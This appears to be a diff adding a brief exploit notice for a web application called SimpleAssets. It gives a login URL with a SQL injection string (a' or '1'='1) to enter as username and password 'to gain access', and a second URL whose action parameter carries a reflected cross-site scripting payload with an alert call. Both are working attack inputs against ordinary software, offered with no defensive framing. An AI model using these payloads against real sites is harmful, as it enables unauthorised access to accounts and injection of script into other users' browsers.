@@ -1,0 +1,4 @@
+http://www.example.com/simpleassets/index.php?action=login&amp;lastaction=&amp;lastkey=&amp;loginout=2
+Use the string a&#039; or &#039;1&#039;=&#039;1 for Username and Password to gain access.
+
+http://server/simpleassets/index.php?action=&#039;&quot;--&gt;&lt;script&gt;alert(0x000872)&lt;/script&gt;
